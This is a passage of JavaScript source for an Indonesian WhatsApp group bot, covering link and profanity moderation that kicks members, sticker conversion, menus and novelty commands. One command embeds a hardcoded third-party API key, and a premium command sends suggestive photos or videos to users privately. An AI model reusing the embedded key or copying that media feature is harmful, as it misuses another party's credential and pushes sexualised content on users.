        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`*Perintah Khusus Untuk Anggota Premium*`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`*${mess.botAdmin}, Untuk Menendang Pengguna Yang Mengirim Tautan*`)
        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 TAUTAN GRUP TERDETEKSI 」\`\`\`\n\n*Anda tidak akan ditendang oleh bot karena yang Anda posting adalah tautan ke grup ini*`})
        if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 TAUTAN GRUP TERDETEKSI 」\`\`\`\n\n*Admin sudah memposting tautan, admin bebas memposting tautan apapun*`})
        if (XeonTheCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 TAUTAN GRUP TERDETEKSI 」\`\`\`\n\n*Pemilik bot telah memposting tautan, pemilik bot bebas memposting tautan apa pun*`})
        kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN GRUP TERDETEKSI 」\`\`\`\n\n*@${kice.split("@")[0]} Telah ditendang karena memposting tautan grup di grup ini*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 WA.ME TAUTAN TERDETEKSI 」\`\`\`\n\n*Admin memposting tautan wa.me, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 WA.ME TAUTAN TERDETEKSI 」\`\`\`\n\n*@${kice.split("@")[0]} Telah ditendang karena memposting tautan wa.me*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN WA.ME TERDETEKSI 」\`\`\`\n\n*Admin memposting tautan wa.me, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN WA.ME TERDETEKSI 」\`\`\`\n\n*@${kice.split("@")[0]} Telah ditendang karena memposting tautan wa.me*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 VIRUS TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting virus*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (BadXeon.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 KATA KOTOR  TERDETEKSI 」\`\`\`\n\n*Anda telah menggunakan kata kotor tetapi karena anda adalah admin/pemilik bot maka anda tidak akan ditendang*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 KATA KOTOR TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena menggunakan kata kotor*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by FallZx
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN VIDIO YOUTUBE TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan vidio youtube, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN VIDIO YOUTUBE TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan vidio youtube*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by FallZx
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 SALURAN YOUTUBE TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan saluran youtube, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 SALURAN YOUTUBE TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan saluran youtube*`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by FallZx
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN INSTAGRAM TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan instagram, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN INSTAGRAM TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan instagram*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by FallZx
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN FACEBOOK TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan facebook, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN FACEBOOK TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan facebook*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by FallZx
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN TELEGRAM TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan telegram, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN TELEGRAM TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan telegram*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by FallZx
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN TIK TOK TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan tik tok, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN TIK TOK TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan tik tok*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by FallZx
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN TWITTER TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan twitter, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN TWITTER TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan twitter*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by FallZx
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 TAUTAN TERDETEKSI 」\`\`\`\n\n*Admin telah memposting tautan, admin bebas memposting tautan*`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 TAUTAN TERDETEKSI 」\`\`\`\n\n*@${m.sender.split("@")[0]} Telah ditendang karena memposting tautan*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
XeonBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
XeonBotInc.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyXeonBotIncList(chath, dblist)) {
var getraindata = getDataXeonBotIncList(chath, dblist)
if (getraindata.isImage === false) {
XeonBotInc.sendMessage(m.chat, { text: sendXeonBotIncList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
XeonBotInc.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
XeonBotInc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji Tidak Sah, Gunakan Emoji Lain\n*Maksimal 1 Emoji*")
}
}

switch (command) {
	case 'public': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                XeonBotInc.public = true
                replygcxeon('*Berhasil Mengubah Ke Penggunaan Publik 👥*')
            }
            break
            case 'self': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                XeonBotInc.public = false
                replygcxeon('*Berhasil Mengubah Ke Pemakaian Sendiri 👤*')
            }
            break
case 'rentbot': {
if (m.isGroup) return replygcxeon(mess.private)
if (!isPrem) return replyprem(mess.premium)
rentfromxeon(XeonBotInc, m, from)
}
break
case 'rentbotlist': 
try {
let user = [... new Set([...global.conns.filter(XeonBotInc => XeonBotInc.user).map(XeonBotInc => XeonBotInc.user)])]
te = "*Daftar Penyewa Bot*\n\n"
for (let i of user){
y = await XeonBotInc.decodeJid(i.id)
te += "*Pengguna:* @" + y.split("@")[0] + "\n"
te += "*Nama:* " + i.name + "\n\n"
}
XeonBotInc.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcxeon(`*Belum Ada Pengguna Yang Menyewa Bot Ini*`)
}
break
case 'shutdown':
if (!XeonTheCreator) return replygcxeon(mess.owner)
replygcxeon(`*Bot Telah Dimatikan*`)
await sleep(3000)
process.exit()
break
case 'ksksjbsvs': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `*Hai @${sender.split("@")[0]}, Dialah Pemilik Saya*`, mentions: [sender]}, { quoted: repf })
}
break
case 'paptt':
            if (!isPrem) return replyprem(mess.premium)
            if (!text) return replygcxeon(`Format: ${prefix+command} *video/foto*`)
            let papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (text == 'foto') {
                replygcxeon("Foto Akan Dikirim Lewat *Obrolan Pribadi*")
                XeonBotInc.sendMessage(m.sender, { image: { url: titid1 }, caption: '*Mana Tahan 🥵*'}, { quoted: m })
            } else if (text == 'video') {
                replygcxeon("Video Akan Dikirim Lewat *Obrolan Pribadi*")
                XeonBotInc.sendMessage(m.sender, { video: { url: titid2 }, caption: '*Mana Tahan🥵*'}, { quoted: m })
            }
        break
case 'cekapikey':
            if (!text) return replygcxeon(`Format: *${prefix+command} Apikey*`)
            let lol = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${text}`)
            replygcxeon(mess.wait)
            if (lol.message == 'success') {
                let ani = `• *Nama:* ${lol.result.username}
*Pukulan Total:* ${lol.result.requests}
*Pukul Hari Ini:* ${lol.result.today}
*Akun:* ${lol.result.account_type}

*Kedaluwarsa:* ${lol.result.expired}`
                XeonBotInc.sendMessage(m.chat, { image: thumb, caption: ani }, { quoted: fkontak })
                } else m.reply('*Apikey Tidak Ditemukan*')
            break
case 'wangy': {
                replygcxeon(mess.wait)
                if (!text) return replygcxeon(`Format: *.wangy Nama*`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                replygcxeon(awikwok)
                }
            break
case 'cekmati': {
                replygcxeon(mess.wait)
                if (!text) return replygcxeon(`Format: *.cekmati Nama*`)
                predea = await axios.get(`https://api.agify.io/?name=${text}`)
                replygcxeon(`Nama: *${predea.data.name}*\nMati Pada Umur: *${predea.data.age} Tahun*`)
                }
            break
case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                replygcxeon(mess.wait)
                if (!m.quoted && !text) return replygcxeon(`Format: *${prefix + command} Teks*`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                replygcxeon(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
case 'juzamma': {
                if (args[0] === 'pdf') {
                    replygcxeon(mess.wait)
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'
                        },
                        mimetype: 'application/pdf',
                        fileName: 'juz-amma-arab-latin-indonesia.pdf'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'docx') {
                    replygcxeon(mess.wait)
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        fileName: 'juz-amma-arab-latin-indonesia.docx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'pptx') {
                    replygcxeon(mess.wait)
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileName: 'juz-amma-arab-latin-indonesia.pptx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'xlsx') {
                    replygcxeon(mess.wait)
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                        fileName: 'juz-amma-arab-latin-indonesia.xlsx'
                    }, {
                        quoted: m
                    })
                } else {
                    if (!text) return replygcxeon(`Format: *${prefix + command} Format*\nFormat Tersedia: *pdf, docx, pptx, xlsx*`)
                }
            }
            break
            case 'asmaulhusna':
            if (!text) return replygcxeon('Format: *.asmaulhusna Nomor*')
            replygcxeon(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=6293c82c5c5db837bc563b56`)
				.then(({ data }) => {
					var text = `No : ${data.result.index}\n`
					text += `Latin: ${data.result.latin}\n`
					text += `Arab : ${data.result.ar}\n`
					text += `Indonesia : ${data.result.id}\n`
					text += `English : ${data.result.en}`
					replygcxeon(text)
				})
				.catch(console.error)
			break
case 'menu':
case 'help':
case 'ggdxcghh':
case 'gvcfg':
case 'jgccvhj':
case 'hgcccv': {
  const messages = ["*Advertisement From Keizha 📣*\n\n*Lihat Cara Menambahkan Bot Hoshino Secara Gratis di Situs Berikut: https://msha.ke/keizha_bot*\n","*Advertisement From Keizha 📣*\n\n*Mengobrol dengan Hoshino? Gunakan Perintah berikut:*\n*- .hoshino Statement` (Ramah) atau*\n*- .hoshino2 Statement` (Toxic)*\n","*Advertisement From Keizha 📣*\n\n*Kamu Bisa Pasang Iklan Berbentuk Teks Disini dengan Harga Rp 15.000 untuk Durasi 1 Bulan (30 Hari), Hubungi wa.me/6281249122429*\n","*Advertisement From Keizha 📣*\n\n*Butuh Bantuan atau Ingin Tahu Cara Menggunakan Bot? Hubungi wa.me/6281249122429 (Jangan Lupa Ucapkan Salam Agar Mendapatkan Respon)*\n","*Advertisement From Keizha 📣*\n\n*Mau Main Game Bot? Kunjungi wa.me/6285163083750 dan ajak Felicia untuk bermain bersama*\n","*Advertisement From Keizha 📣*\n\n*Bergabung dengan Grup Resmi Bot Felicia dan Hoshino di WhatsApp: https://chat.whatsapp.com/HanfYszpKzbGcCGgWdHLTa*\n","*Advertisement From Keizha 📣*\n\n*Jika Bot Tidak Merespon Namun Terdapat Tanda Centang Biru, Silakan Ulangi Perintah Setelah 1 Menit Tanpa Mendapatkan Respon. Apabila Bot Masih Tidak Merespon, Harap Menunggu Beberapa Saat.*\n","*Advertisement From Keizha 📣*\n\n*Kami mengundang Anda untuk berpartisipasi dalam donasi demi meningkatkan kualitas bot ini. Donasi Anda akan digunakan untuk pengembangan dan peningkatan fitur-fitur yang ada. Anda dapat melakukan donasi melalui situs resmi kami di http://trakteer.id/is_keizha. Setiap sumbangan yang Anda berikan akan sangat berarti bagi kami. Terima kasih atas kontribusi dan dukungan Anda.*\n"];
  let randomMessageIndex = Math.floor(Math.random() * messages.length);
  let ownernya = ownernomer + '@s.whatsapp.net'
  let me = m.sender
  let timestampe = speed();
  let latensie = speed() - timestampe
  xeonezy = ``
  let ments = [ownernya, me, mark]
  
  const thumbnailPath = './XeonMedia/theme/cheemspic.jpg';
  const videoPath = './XeonMedia/theme/cheemspic.mp4';
    
  // Baca file video dan thumbnail
  const videoData = fs.readFileSync(videoPath);
  const thumbnailData = fs.readFileSync(thumbnailPath);

  XeonBotInc.sendMessage(from, {
    text: messages[randomMessageIndex],
    contextInfo: {
      forwardingScore: 9999999,
      isForwarded: true,
      mentionedJid: [sender],
      "externalAdReply": {
        "showAdAttribution": true,
        "renderLargerThumbnail": true,
        "title": botname, 
        "containsAutoReply": true,
        "mediaType": 2, // Gunakan 2 untuk tipe video
        "thumbnail": thumbnailData,
        "mediaUrl": videoData,
        "sourceUrl": `${wagc}`
      }
    }
  }, { quoted: m });
}
break;
case 'ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'toolsmenu': {
var unicorn = await getBuffer(picak+'Tools Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${toolsmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'infomenu': {
var unicorn = await getBuffer(picak+'Info Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${infomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'islammenu': {
var unicorn = await getBuffer(picak+'Islam Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${islammenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'suaramenu': {
	var unicorn = await getBuffer(picak+'Suara Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${suaramenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': {
var unicorn = await getBuffer(picak+'Download Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'groupmenu': {
var unicorn = await getBuffer(picak+'Group Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'funmenu': {
var unicorn = await getBuffer(picak+'Fun Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stalkermenu': {
var unicorn = await getBuffer(picak+'Stalker Menu')
